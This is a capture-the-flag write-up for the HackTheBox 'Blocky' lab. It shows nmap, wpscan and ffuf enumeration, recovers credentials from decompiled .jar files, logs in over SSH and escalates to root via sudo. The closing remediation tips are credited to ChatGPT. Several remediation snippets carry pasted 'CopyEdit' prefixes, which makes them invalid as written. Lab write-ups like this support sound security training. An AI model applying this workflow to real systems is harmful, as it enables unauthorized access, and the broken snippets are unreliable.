# Blocky  - HTB

**Machine Author: Arrexel** **Difficulty: Easy** **Classification: Official**

#### Synopsis

It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system.

#### Enumeration

```bash
C:\home\kali\Downloads> nmap -sV -sC 10.129.157.248  -T4 -p- --min-rate=1000 -v
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 11:31 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Scanning 10.129.157.248 [4 ports]
Completed Ping Scan at 11:31, 0.60s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:31
Completed Parallel DNS resolution of 1 host. at 11:31, 0.03s elapsed
Initiating SYN Stealth Scan at 11:31
Scanning 10.129.157.248 [65535 ports]
Discovered open port 21/tcp on 10.129.157.248
Discovered open port 80/tcp on 10.129.157.248
Discovered open port 22/tcp on 10.129.157.248
Host is up (0.071s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We check the port 80 and we need to add the host to our `/etc/hosts`

```bash
`echo '10.10.10.14 blocky.ht' >> /etc/hosts
```

We visit the blog and found is runnign `wordpress`

<figure><img src="../.gitbook/assets/Pasted image 20250220140041.png" alt=""><figcaption></figcaption></figure>

We start enumerating with `wpscan`

```bash
 wpscan --url http://blocky.htb/ -e ap,u     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blocky.htb/ [10.129.157.248]
[+] Started: Thu Feb 20 13:37:13 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

We have found some good hints with this scan. Then we start with `ffuf` for directory listing.

```bash
ffuf -c -w common.txt -u http://blocky.htb/FUZZ -t 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blocky.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 194ms]
.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 5544ms]
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 5549ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 270ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 270ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 279ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 277ms]
wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 263ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 261ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 264ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 266ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 377ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1205ms]
```

Then we start visiting each directory for manual crawling. `http://blocky.htb/plugins/` The directory shows two `.jar` files

<figure><img src="../.gitbook/assets/Pasted image 20250220140320.png" alt=""><figcaption></figcaption></figure>

We use https://java-decompiler.github.io/ for a `java decompiler` !\[\[Pasted image 20250220140447.png]] We have found some credentials... In the previous directories were not successful `phpmyadmin`. Then, we are try to login in ssh with the two user that we have found with `wp-scan`

<figure><img src="../.gitbook/assets/Pasted image 20250220140447 (1).png" alt=""><figcaption></figcaption></figure>

```bash
[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

The login was successful

```bash
C:\home\kali\htb\blocky> ssh notch@10.129.157.248
notch@10.129.157.248's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
```

Well, the privilege escalation was easy since `notch` is in sudoers.

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Sorry, try again.
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# ls
```

#### Remediation provided by chatgpt

#### **Remediation Summary**

**Web Security Fixes**

1. **Remove Hardcoded Credentials** – Never store passwords in `.jar` files. Use environment variables or secure vaults like **HashiCorp Vault**.
2.  **Restrict Directory Access** – Disable directory listing in `.htaccess` or Apache config:

    ```apache
    apacheCopyEditOptions -Indexes
    ```
3. **Secure WordPress** – Update to the latest version, disable `xmlrpc.php`, and remove `readme.html`. More tips: **Hardening WordPress**.
4.  **Restrict phpMyAdmin Access** – Limit access via `.htaccess` or firewall rules. Example:

    ```apache
    apacheCopyEdit<Directory "/usr/share/phpmyadmin">
        Require ip 192.168.1.100
    </Directory>
    ```
5.  **Protect `.htaccess` & `.htpasswd`** – Block direct access:

    ```apache
    apacheCopyEdit<FilesMatch "^\.">
        Order allow,deny
        Deny from all
    </FilesMatch>
    ```
6.  **Disable `server-status`** – Disable or restrict to localhost:

    ```apache
    apacheCopyEdit<Location "/server-status">
        Require ip 127.0.0.1
    </Location>
    ```

**Privilege Escalation & `sudo` Fixes**

1.  **Restrict `sudo` Access** – Remove `ALL=(ALL) ALL` and allow only necessary commands in `/etc/sudoers`:

    ```bash
    bashCopyEditnotch  ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2
    ```

#### **Further Reading**

* **Linux Privilege Escalation Guide:** GTFOBins
* **Securing Apache:** [Official Apache Security Tips](https://httpd.apache.org/docs/current/misc/security_tips.html)
* **WordPress Hardening:** Security Guide

These quick fixes will **lock down** the web side and prevent **easy privilege escalation**! 🚀
